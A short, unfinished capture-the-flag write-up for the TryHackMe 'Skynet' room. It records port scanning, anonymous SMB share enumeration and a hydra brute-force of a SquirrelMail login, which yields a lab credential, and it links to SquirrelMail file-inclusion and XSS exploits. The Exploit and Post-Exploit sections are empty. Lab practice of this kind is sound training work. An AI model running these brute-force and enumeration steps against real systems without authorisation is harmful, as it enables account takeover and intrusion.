# Skynet

https://tryhackme.com/room/skynet

## Scanning/Enumeration

```sh
nmap -v -T4 -sC -sV $TARGET_IP -Pn -oN nmap.txt

# 22  ssh;   OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
# 80  http;  Apache httpd 2.4.18
# 110 pop3;  Dovecot pop3d
# 143 imap;  Dovecot imapd
# 445 Samba; smbd 3.x-4.x => guest

gobuster dir -u $TARGET_IP -w /usr/share/wordlists/dirb/common.txt > gobuster.txt
```

went to `http://$TARGET_IP:80/index.html`; POST form unsure if useful

went to `http://$TARGET_IP:80/squirrelmail/src/login.php`; login, also PHP, squirrelmail 1.4.23

```sh
# checking out samba

# https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/

/opt/enum4linux.pl -U $TARGET_IP
# user: milesdyson

smbclient -L $TARGET_IP -U '' -N
smbclient //$TARGET_IP/anonymous -U '' -N

# smb
get attention.txt
cd logs
get logs.txt
get log2.txt
get log3.txt

# log1.txt -> passwords...I think
```

```sh
# brute force milesdyson with password list

hydra $TARGET_IP -V http-form-post \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=16&just_logged_in=1:F=Unknown user or password incorrect." \
  -l milesdyson \
  -P log1.txt

# creds milesdyson:cyborg007haloterminator
```

## Vulnerabilities

- [Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion](https://www.exploit-db.com/exploits/27948)
- [SquirrelMail 1.4.x - Folder Name Cross-Site Scripting](https://www.exploit-db.com/exploits/24068)

## Exploit

## Post-Exploit

